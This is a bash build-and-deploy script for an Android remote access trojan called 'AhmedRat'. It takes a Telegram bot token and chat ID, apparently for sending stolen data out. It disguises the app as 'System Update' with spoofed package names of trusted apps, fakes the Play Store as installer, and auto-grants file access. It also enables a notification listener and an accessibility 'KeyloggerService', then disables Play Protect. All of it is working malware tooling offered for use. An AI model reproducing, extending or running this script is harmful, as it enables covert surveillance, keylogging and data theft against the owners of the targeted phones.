#!/bin/bash
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; RESET='\033[0m'
BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

show_banner() {
    echo -e "${CYAN}"
    cat << "BANNER"
╔═══════════════════════════════════════════════════════════════╗
║   ▄▄▄      ▄▄▄            ▄▄▄▄   ▄▄                      ▄▄   ║
║   ████▄  ▄████          ▄██▀▀██▄ ██                      ██   ║
║   ███▀████▀███ ████▄    ███  ███ ████▄ ███▄███▄ ▄█▀█▄ ▄████   ║
║   ███  ▀▀  ███ ██ ▀▀    ███▀▀███ ██ ██ ██ ██ ██ ██▄█▀ ██ █    ║
║   ███      ███ ██    ██ ███  ███ ██ ██ ██ ██ ██ ▀█▄▄▄ ▀███ Rat║
║                                                               ║
║    Copyright © 2026 Mr. Ahmed | Email: yemenspam@gmail.com    ║
╚═══════════════════════════════════════════════════════════════╝
BANNER
    echo -e "${RESET}"
}

deps=("java" "gradle" "python3" "adb" "zipalign" "apksigner")
missing=0
for dep in "${deps[@]}"; do
    if ! command -v $dep &> /dev/null; then echo -e "${RED}[!] Missing system tool: $dep${RESET}"; missing=1; fi
done
if [ $missing -eq 1 ]; then exit 1; fi

export ANDROID_HOME=${ANDROID_HOME:-"/usr/lib/android-sdk"}
export PATH=$PATH:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools/34.0.0

clear
show_banner
echo -e "${GREEN}[+] All system dependencies met.${RESET}\n"

echo -e "${CYAN}Choose Language / اختر اللغة:${RESET}"
echo "1) Arabic"; echo "2) English"
read -p "> " LANG

if [ "$LANG" == "1" ]; then 
    T_TOKEN="أدخل توكن البوت: "; T_CHAT="أدخل معرف الدردشة: "; 
    T_APP="اسم التطبيق (افتراضي: System Update): "; 
    T_PKG="اسم الحزمة (اتركه فارغاً لانتحال شخصية تطبيق موثوق): "; 
    T_ICON="مسار الأيقونة (افتراضي: yemenrat.png): "
else 
    T_TOKEN="Bot Token: "; T_CHAT="Chat ID: "; 
    T_APP="App Name (default: System Update): "; 
    T_PKG="Package Name (leave blank to spoof a trusted app): "; 
    T_ICON="Icon Path (default: yemenrat.png): "; 
fi

echo ""; read -p "$T_TOKEN" TOKEN; read -p "$T_CHAT" CHAT_ID
read -p "$T_APP" APP_NAME; APP_NAME=${APP_NAME:-System Update}
read -p "$T_PKG" PKG_NAME

if [ -z "$PKG_NAME" ]; then
    SPOOF_NAMES=("com.google.android.gms.update" "com.android.systemui.plugin" "com.whatsapp.updater" "com.android.vending.helper" "com.mobile.legends.patch")
    RAND_IDX=$((RANDOM % ${#SPOOF_NAMES[@]}))
    PKG_NAME="${SPOOF_NAMES[$RAND_IDX]}"
    echo -e "${GREEN}[+] Spoofed Package Name Generated: $PKG_NAME${RESET}"
fi

read -p "$T_ICON" ICON_PATH

echo -e "${CYAN}[*] Building...${RESET}"
python3 src/create_templates.py
python3 src/builder.py "$TOKEN" "$CHAT_ID" "$APP_NAME" "$PKG_NAME" "$ICON_PATH"

if [ -f "$BASE_DIR/output/AhmedRat.apk" ]; then
    echo -e "${GREEN}============================================================${RESET}"
    echo -e "${WHITE}  ✅ BUILD SUCCESSFUL!${RESET}"
    echo -e "${WHITE}  📁 APK Path: $BASE_DIR/output/AhmedRat.apk${RESET}"
    echo -e "${GREEN}============================================================${RESET}"
    
    echo ""
    echo -e "${CYAN}هل تريد تثبيت التطبيق الآن وتفعيل كل الصلاحيات تلقائياً؟ (y/n)${RESET}"
    read -p "> " INSTALL_CHOICE
    if [ "$INSTALL_CHOICE" == "y" ] || [ "$INSTALL_CHOICE" == "Y" ]; then
        echo -e "${YELLOW}[*] Waiting for device (Make sure USB Debugging is ON)...${RESET}"
        adb wait-for-device
        
        echo -e "${YELLOW}[*] Installing APK & Granting Permissions...${RESET}"
        adb install -r -g -i com.android.vending "$BASE_DIR/output/AhmedRat.apk"
        
        echo -e "${YELLOW}[*] Granting All Files Access (Fix for Photos)...${RESET}"
        adb shell appops set "$PKG_NAME" MANAGE_EXTERNAL_STORAGE allow
        
        echo -e "${YELLOW}[*] Enabling Notification Listener automatically...${RESET}"
        adb shell cmd notification allow_listener "$PKG_NAME/$PKG_NAME.NotifListener"
        
        echo -e "${YELLOW}[*] Enabling Accessibility Service automatically...${RESET}"
        adb shell settings put secure enabled_accessibility_services "$PKG_NAME/$PKG_NAME.KeyloggerService"
        adb shell settings put secure accessibility_enabled 1
        
        echo -e "${YELLOW}[*] Disabling Play Protect temporarily...${RESET}"
        adb shell settings put global package_verifier_enable 0
        
        echo -e "${YELLOW}[*] Launching App...${RESET}"
        adb shell monkey -p "$PKG_NAME" -c android.intent.category.LAUNCHER 1 > /dev/null 2>&1
        
        echo -e "${GREEN}[+] Installed, Permissions Granted, Notifications Enabled, and App Started!${RESET}"
    fi
fi
